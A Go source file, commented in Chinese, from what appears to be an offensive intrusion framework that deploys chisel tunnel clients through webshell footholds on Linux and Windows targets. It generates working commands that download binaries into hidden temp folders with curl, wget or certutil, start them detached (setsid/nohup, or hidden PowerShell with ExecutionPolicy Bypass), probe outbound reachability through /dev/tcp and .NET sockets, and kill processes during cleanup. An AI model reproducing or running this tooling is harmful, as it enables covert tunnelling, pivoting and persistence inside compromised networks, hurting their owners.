// platform.go 是隧道子系统对「目标侧执行环境」的唯一抽象。
//
// 为什么需要它：此前 deploy.go / suo5.go / probe.go 里对目标的每一个动作都是
// 内联的 Unix 语法——/tmp/.<tag>、mkdir -p、chmod +x、setsid+nohup、/proc/<pid>、
// /dev/tcp。结果是 Windows 立足点（aspx/asp 马）能侦察、却一条隧道也建不起来：
// 卡在 chmod 上，而报错还写着「目标可能 noexec 挂载 /tmp」——把人往完全错误的
// 方向带（那不是挂载问题，是根本没有 chmod）。
//
// 判据：能力适配不是「多支持一种系统」，而是「同一条部署流程在不同形态的目标上
// 都能走完，走不完时明确说清卡在哪一层、为什么」。所以本文件只做两件事：
//
//  1. 把「建目录/投递/置执行位/后台拉起/杀进程/清理/出网探针」这些动作按平台
//     参数化，Linux 分支逐字保持原有命令（零回归），Windows 分支给出对应实现；
//  2. 用 DeployCaps 如实声明每种形态下哪些层是 supported、哪些是 unknown——
//     不假装 Windows 的脱离会话能力已被验证过（见 Caps 注释）。
package tunnel

import (
	"fmt"
	"net"
	"strconv"
	"strings"

	"chengjian.local/chengjian/session"
)

// Platform 是目标侧执行环境的形态。
type Platform string

const (
	PlatformLinux   Platform = "linux"
	PlatformWindows Platform = "windows"
)

// PlatformOf 归一化平台取值。空串按 linux 处理——既有台账行没有这个字段，
// 反序列化后必须仍按 Unix 路径工作（向后兼容，不是猜测）。
func PlatformOf(s string) Platform {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "windows", "win", "win32", "win64":
		return PlatformWindows
	case "", "linux", "unix", "darwin", "bsd":
		return PlatformLinux
	default:
		return PlatformLinux
	}
}

// PlatformForSession 判定立足点平台。
//
// 判定逻辑不在这里：唯一的实现是 session.PlatformForSession（驱动自报 >
// 马型推断）。本函数只做取值归一化。之所以不再自己写一份，是因为「平台怎么
// 判」一旦有两份实现，就会变成「隧道按 Windows 走、侦察按 Linux 走」这种
// 自相矛盾的现场。
func PlatformForSession(sess session.Session) Platform {
	return PlatformOf(session.PlatformForSession(sess))
}

// CapabilityState 复用 session 包的三态词汇（supported/unsupported/unknown），
// 避免隧道子系统自造一套「行/不行」的措辞。
type CapabilityState = session.CapabilityState

const (
	CapabilityUnknown     = session.CapabilityUnknown
	CapabilitySupported   = session.CapabilitySupported
	CapabilityUnsupported = session.CapabilityUnsupported
)

// DeployCaps 声明一种平台形态下隧道部署各层的能力状态。
//
// 为什么需要声明而不是「都试一遍」：Windows 上「脱离会话后台常驻」这件事没有
// 普适答案——cmd 的 start /b 在 IIS 应用池回收时会连子进程一起收走，schtasks
// 能常驻但会留计划任务痕迹。我们实现的是 PowerShell Start-Process -PassThru
// （能拿回真实 pid、可核对身份），它在多数机器上可用，但「应用池回收后仍活」
// 这一条没有在真实目标上验证过。所以这里如实标 unknown，而不是标 supported：
// 部署会继续，但返回给调用方的 note 会写明「常驻性未验证，建议随后
// tunnel_health 复核」。
type DeployCaps struct {
	// ExecBit 是否需要并支持设置执行位。Linux 需要；Windows 不需要（有 .exe
	// 后缀即可执行），语义上是 unsupported 但无害。
	ExecBit CapabilityState
	// Detach 后台进程能否脱离会话常驻。
	Detach CapabilityState
	// PidReceipt 能否在拉起后取回真实 pid（清理阶段核对身份的前提）。
	PidReceipt CapabilityState
	// ProcIdentity 能否核对 pid 的进程身份（防 pid 复用误杀）。
	ProcIdentity CapabilityState
	// EgressProbe 出网探针能否在目标侧执行。
	EgressProbe CapabilityState
	// Note 是给调用方看的一句话说明（为什么某项是 unknown）。
	Note string
}

// HostShell 是目标侧命令生成器。值类型、无状态，可安全复制。
type HostShell struct{ p Platform }

// HostOf 按平台取命令生成器。空平台按 linux（见 PlatformOf）。
func HostOf(p Platform) HostShell { return HostShell{p: PlatformOf(string(p))} }

// Platform 返回归一化后的平台。
func (h HostShell) Platform() Platform { return h.p }

// IsWindows 便捷判定。
func (h HostShell) IsWindows() bool { return h.p == PlatformWindows }

// BinName 是目标侧客户端二进制文件名。Windows 必须带 .exe——不带后缀的
// chisel 在 cmd 下无法直接执行（CreateProcess 不补后缀，除非用 start）。
func (h HostShell) BinName() string {
	if h.IsWindows() {
		return "ch.exe"
	}
	return "ch"
}

// Caps 返回该平台的能力声明（见 DeployCaps 注释：Windows 的 Detach 是 unknown）。
func (h HostShell) Caps() DeployCaps {
	if h.IsWindows() {
		return DeployCaps{
			ExecBit:      CapabilityUnsupported,
			Detach:       CapabilityUnknown,
			PidReceipt:   CapabilitySupported,
			ProcIdentity: CapabilitySupported,
			EgressProbe:  CapabilitySupported,
			Note: "Windows：路径/投递/拉起/清理/探针均已按 cmd+PowerShell 实现；" +
				"「IIS 应用池回收后子进程是否仍常驻」未在真实目标验证——建完请用 tunnel_health 复核，别默认它会一直在。",
		}
	}
	return DeployCaps{
		ExecBit:      CapabilitySupported,
		Detach:       CapabilitySupported,
		PidReceipt:   CapabilitySupported,
		ProcIdentity: CapabilitySupported,
		EgressProbe:  CapabilitySupported,
	}
}

// TempDirExpr 返回远端工作目录表达式。
//
// Linux 直接给字面路径（/tmp/.<tag>），不需要任何展开——这是既有行为。
// Windows 用 %TEMP%\<tag>：IIS 应用池身份的 %TEMP% 通常是 C:\Windows\Temp，
// 但会随配置变化，写死 C:\Windows\Temp 会在一部分机器上不可写。%TEMP% 需要
// cmd 展开，因此调用方必须先跑 DirExprCmd 把它解析成字面路径再落盘到台账
// （见 deploy.resolveRemotePaths）——台账里存表达式会导致重启后清理命令
// 在非 cmd 上下文里拿到未展开的 %TEMP%。
func (h HostShell) TempDirExpr(tag string) string {
	if h.IsWindows() {
		return `%TEMP%\` + tag
	}
	return "/tmp/." + tag
}

// DirExprCmd 返回让目标自己回显工作目录父级的命令。空串 = 表达式已是字面量，
// 无需解析（Linux）。
func (h HostShell) DirExprCmd() string {
	if h.IsWindows() {
		return "echo %TEMP%"
	}
	return ""
}

// ParseDirExpr 解析 DirExprCmd 的回显，取出目录字面量并做内联安全校验。
// 拒绝会破坏外层引号/命令分隔的字符——这些值后续要内联进 cmd 与 sh 命令里。
func (h HostShell) ParseDirExpr(out string) (string, error) {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(strings.TrimRight(line, "\r"))
		if line == "" {
			continue
		}
		if strings.ContainsAny(line, "'\"`$;|&<>") {
			return "", fmt.Errorf("目标侧目录含危险字符，拒绝内联： %q", line)
		}
		if h.IsWindows() {
			// 形态：C:\... 或 \\server\share\...
			if !strings.Contains(line, `:\`) && !strings.HasPrefix(line, `\\`) {
				return "", fmt.Errorf("Windows 目标目录形态无法识别： %q", line)
			}
		} else if !strings.HasPrefix(line, "/") {
			return "", fmt.Errorf("目标目录不是绝对路径： %q", line)
		}
		return line, nil
	}
	return "", fmt.Errorf("目录回显为空（通道异常？）")
}

// Join 拼接远端路径，按平台选分隔符。
func (h HostShell) Join(dir, name string) string {
	dir = strings.TrimRight(dir, `/\`)
	if h.IsWindows() || strings.Contains(dir, `\`) {
		return dir + `\` + name
	}
	return dir + "/" + name
}

// WorkDirCmd 是「回显会话当前工作目录」的命令。
// Windows cmd 没有 pwd，`cd` 不带参数才是打印当前目录。
func (h HostShell) WorkDirCmd() string {
	if h.IsWindows() {
		return "cd"
	}
	return "pwd"
}

// Mkdir 建目录（幂等）。
func (h HostShell) Mkdir(dir string) string {
	if h.IsWindows() {
		return `if not exist "` + dir + `" mkdir "` + dir + `"`
	}
	return "mkdir -p " + dir
}

// DeliverCmd 是「建目录 → 下载到 out → 回显哨兵」的完整命令。
//
// 每个平台自己决定成功判据：Linux 看下载命令的退出码；Windows 看文件是否
// 真的存在（curl.exe 缺失时退出码不可信，certutil 又会写缓存而不报错）。
// 让平台自己表达判据，调用方就只认哨兵，不再猜。
func (h HostShell) DeliverCmd(url, out, dir, mk string) string {
	ok, fail := mk+"_OK", mk+"_FAIL"
	if h.IsWindows() {
		// ① curl.exe（Win10 1803+ 内置）；② certutil -urlcache（LOLBin，全版本可用）。
		// 用 & 而不是 && 串联：cmd 的 && / || 是左结合的，混用会让「第一步成功」
		// 直接短路掉哨兵回显。分号语义的 & 才能保证每条都执行。
		return fmt.Sprintf(
			`if not exist "%s" mkdir "%s" & `+
				`(if not exist "%s" curl.exe -fsSL -m 90 "%s" -o "%s") & `+
				`(if not exist "%s" certutil -urlcache -split -f "%s" "%s" >nul 2>nul) & `+
				`if exist "%s" (echo %s) else (echo %s)`,
			dir, dir, out, url, out, out, url, out, out, ok, fail)
	}
	return fmt.Sprintf(
		`mkdir -p %s && (curl -fsSL -m 90 '%s' -o %s 2>/dev/null || wget -q -T 90 -O %s '%s' 2>/dev/null) && echo %s || echo %s`,
		dir, url, out, out, url, ok, fail)
}

// ChmodCmd 是「置执行位并回显哨兵」的完整命令。空串 = 该平台不需要这一步，
// 调用方跳过（Windows 靠 .exe 后缀执行，没有执行位概念）。
func (h HostShell) ChmodCmd(bin, mk string) string {
	if h.IsWindows() {
		return ""
	}
	return fmt.Sprintf("chmod +x %s && echo %s_OK || echo %s_FAIL", bin, mk, mk)
}

// SpawnCmd 是「后台拉起客户端并回显 pid」的完整命令。
//
// Linux：setsid + nohup 脱离会话，$! 拿 pid，AUTH 走 env（不进 ps）。
// Windows：cmd 的 start /b 拿不到 pid，且 %! 之类不存在，所以用 PowerShell
// Start-Process -PassThru 取真实 pid；AUTH 先写进 $env 再拉起，同样不进命令行。
func (h HostShell) SpawnCmd(dir, bin, logPath, authUser, authPass string, args []string, mk string) string {
	if h.IsWindows() {
		// -ArgumentList 用单引号逐个包，逗号分隔（PS 数组字面量）。
		quoted := make([]string, 0, len(args))
		for _, a := range args {
			quoted = append(quoted, "'"+strings.ReplaceAll(a, "'", "''")+"'")
		}
		script := fmt.Sprintf(
			`$env:AUTH='%s:%s'; `+
				`$p=Start-Process -FilePath '%s' -ArgumentList %s -WindowStyle Hidden `+
				`-RedirectStandardOutput '%s' -RedirectStandardError '%s.err' -PassThru; `+
				`Write-Output ('%s_PID=' + $p.Id)`,
			authUser, authPass, bin, strings.Join(quoted, ","), logPath, logPath, mk)
		return `powershell -NoProfile -ExecutionPolicy Bypass -Command "` + script + `"`
	}
	return fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo %s_PID=$!`,
		dir, authUser, authPass, strings.Join(args, " "), logPath, mk)
}

// RemoveDirCmd 是「删远端目录并回显哨兵」的完整命令。
func (h HostShell) RemoveDirCmd(dir, mk string) string {
	if h.IsWindows() {
		// rmdir 失败不报错（目录可能已不在），以「删完是否还存在」为判据。
		return fmt.Sprintf(`if exist "%s" rmdir /s /q "%s" & if exist "%s" (echo %s_FAIL) else (echo %s_OK)`,
			dir, dir, dir, mk, mk)
	}
	return "rm -rf -- '" + strings.ReplaceAll(dir, "'", `'"'"'`) + "' && echo " + mk + "_OK"
}

// KillInspectCmd 是「确认 pid 还活着且身份匹配」的完整命令。回显里出现
// <mk>_NOPROC 表示进程已不在（清理可直接算成功）；出现 <mk>_UNKNOWN 表示
// 无法判定（没有 /proc 之类），调用方必须按「未确认」处理，不能当成功。
func (h HostShell) KillInspectCmd(pid int, bin, mk string) string {
	if h.IsWindows() {
		// Get-CimInstance 取命令行（wmic 在 Win11 24H2 已被移除，不能用）。
		// 空输出 = 进程不存在。
		script := fmt.Sprintf(
			`$p=Get-CimInstance Win32_Process -Filter 'ProcessId=%d' -ErrorAction SilentlyContinue; `+
				`if ($p) { $p.CommandLine } else { '%s_NOPROC' }`,
			pid, mk)
		return `powershell -NoProfile -ExecutionPolicy Bypass -Command "` + script + `"`
	}
	return fmt.Sprintf(`if kill -0 %d 2>/dev/null; then tr '\0' ' ' < /proc/%d/cmdline 2>/dev/null; echo; readlink /proc/%d/exe 2>/dev/null; elif [ -d /proc/self ] && [ ! -d /proc/%d ]; then echo %s_NOPROC; else echo %s_UNKNOWN; fi`,
		pid, pid, pid, pid, mk, mk)
}

// KillStopCmd 是「核对身份后停进程并确认」的完整命令。
func (h HostShell) KillStopCmd(pid int, bin, mk string) string {
	if h.IsWindows() {
		// 先按命令行核对身份（防 pid 复用误杀），再 Stop-Process；用 Get-Process
		// 而不是解析 tasklist 文本——tasklist 的输出是本地化的（中文 Windows 是
		// 「信息: 没有运行的任务…」），按英文关键词判定会在中文系统上永远失败。
		script := fmt.Sprintf(
			`$p=Get-CimInstance Win32_Process -Filter 'ProcessId=%d' -ErrorAction SilentlyContinue; `+
				`if (-not $p) { '%s_OK' } `+
				`elseif ($p.CommandLine -and $p.CommandLine.Contains('%s')) { `+
				`Stop-Process -Id %d -Force -ErrorAction SilentlyContinue; Start-Sleep -Milliseconds 400; `+
				`if (Get-Process -Id %d -ErrorAction SilentlyContinue) { '%s_FAIL' } else { '%s_OK' } } `+
				`else { '%s_NOMATCH' }`,
			pid, mk, strings.ReplaceAll(bin, `\`, `\\`), pid, pid, mk, mk, mk)
		return `powershell -NoProfile -ExecutionPolicy Bypass -Command "` + script + `"`
	}
	bin2 := strings.ReplaceAll(bin, "'", `'"'"'`)
	owned := fmt.Sprintf(`[ "$(readlink /proc/%d/exe 2>/dev/null)" = '%s' ] || [ "$(readlink /proc/%d/exe 2>/dev/null)" = '%s (deleted)' ]`,
		pid, bin2, pid, bin2)
	return fmt.Sprintf("if %s; then kill %d 2>/dev/null; sleep 1; if %s; then kill -9 %d 2>/dev/null; fi; fi; if kill -0 %d 2>/dev/null; then echo %s_FAIL; elif [ -d /proc/self ] && [ ! -d /proc/%d ]; then echo %s_OK; else echo %s_UNKNOWN; fi",
		owned, pid, owned, pid, pid, mk, pid, mk, mk)
}

// KillIdentityMatches 判断 KillInspectCmd 的回显是否证明 pid 就是我们的客户端。
// Windows 的 CommandLine 是一整行（含参数），Linux 会分行打印 cmdline 与 exe。
func (h HostShell) KillIdentityMatches(stdout, bin string) bool {
	for _, line := range strings.Split(stdout, "\n") {
		line = strings.TrimSpace(strings.TrimRight(line, "\r"))
		if line == "" {
			continue
		}
		if h.IsWindows() {
			// CommandLine 形如 `"C:\...\ch.exe" client --keepalive ...`
			if strings.Contains(line, bin) {
				return true
			}
			continue
		}
		if line == bin || line == bin+" (deleted)" || strings.HasPrefix(line, bin+" ") {
			return true
		}
	}
	return false
}

// ProbeCmd 生成一条带哨兵的出网探针命令（kind: tcp|http|dns|icmp）。
//
// Windows 分支刻意用 .NET 的 SocketErrorCode 而不是异常文本：.NET 的异常消息
// 是本地化的，按 "Connection refused" 匹配在中文/日文系统上会全部落到 FAIL，
// 于是「路径通、只是没监听」被误判成「被过滤」——那会让 Conclude 建议放弃
// 反向隧道，正好反了。SocketErrorCode 是枚举，与语言无关。
func (h HostShell) ProbeCmd(kind, tag, target, pfx string) string {
	ok := pfx + "_" + tag + "_OK"
	fail := pfx + "_" + tag + "_FAIL"
	host, port, _ := net.SplitHostPort(target)
	if h.IsWindows() {
		switch kind {
		case "tcp":
			script := fmt.Sprintf(
				`try{ $c=New-Object Net.Sockets.TcpClient; $a=$c.BeginConnect('%s',%s,$null,$null); `+
					`if ($a.AsyncWaitHandle.WaitOne(6000)) { $c.EndConnect($a); '%s' } else { '%s_FILTERED' } } `+
					`catch{ $e=$_.Exception; while ($e.InnerException) { $e=$e.InnerException }; `+
					`$code=''+$e.SocketErrorCode; `+
					`if ($code -eq 'ConnectionRefused') { '%s_REFUSED' } `+
					`elseif ($code -eq 'TimedOut') { '%s_FILTERED' } else { '%s' } } `+
					`finally{ if ($c) { $c.Close() } }`,
				host, port, ok, ok, ok, ok, fail)
			return `powershell -NoProfile -ExecutionPolicy Bypass -Command "` + script + `"`
		case "http":
			// curl.exe 自 Win10 1803 起内置；缺失时该探针回落 FAIL（由调用方
			// 按「该探针未执行」处理，不影响 tcp 探针的结论）。
			return fmt.Sprintf(`for /f %%i in ('curl.exe -s -o nul -m 8 -w "%%{http_code}" http://%s/ 2^>nul') do @if "%%i"=="000" (echo %s) else (echo %s_%%i)`,
				target, fail, ok)
		case "dns":
			script := fmt.Sprintf(`try{ [Net.Dns]::GetHostAddresses('%s')|Out-Null; '%s' }catch{ '%s' }`, host, ok, fail)
			return `powershell -NoProfile -ExecutionPolicy Bypass -Command "` + script + `"`
		case "icmp":
			return fmt.Sprintf(`ping -n 1 -w 2000 %s >nul 2>nul && (echo %s) || (echo %s)`, host, ok, fail)
		}
		return "echo " + fail
	}
	return probeCmd(kind, tag, target, pfx)
}

// TCPReachCmd 判定「从目标侧能否到达 host:port」——用于 portfwd 部署前的
// 目标可达性预检。语义是「包能不能到」，所以 connect 成功与拒连都算通
// （拒连是 RST，证明对端路由到了，只是端口没开），只有超时/不可达算不通。
func (h HostShell) TCPReachCmd(host string, port int, mk string) string {
	if h.IsWindows() {
		script := fmt.Sprintf(
			`try{ $c=New-Object Net.Sockets.TcpClient; $a=$c.BeginConnect('%s',%d,$null,$null); `+
				`if ($a.AsyncWaitHandle.WaitOne(5000)) { '%s_OK' } else { '%s_FAIL' } } `+
				`catch{ $e=$_.Exception; while ($e.InnerException) { $e=$e.InnerException }; `+
				`if (''+$e.SocketErrorCode -eq 'ConnectionRefused') { '%s_OK' } else { '%s_FAIL' } } `+
				`finally{ if ($c) { $c.Close() } }`,
			host, port, mk, mk, mk, mk)
		return `powershell -NoProfile -ExecutionPolicy Bypass -Command "` + script + `"`
	}
	return fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo %s_OK || echo %s_FAIL`,
		host, port, mk, mk)
}

// ShellQuote 把任意字符串包成可在目标 shell 里安全内联的字面量。
func (h HostShell) ShellQuote(s string) string {
	if h.IsWindows() {
		return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
	}
	return "'" + strings.ReplaceAll(s, "'", `'"'"'`) + "'"
}

// ListenPortArg 把端口转成命令行字符串（避免 fmt 里到处 strconv）。
func ListenPortArg(p int) string { return strconv.Itoa(p) }
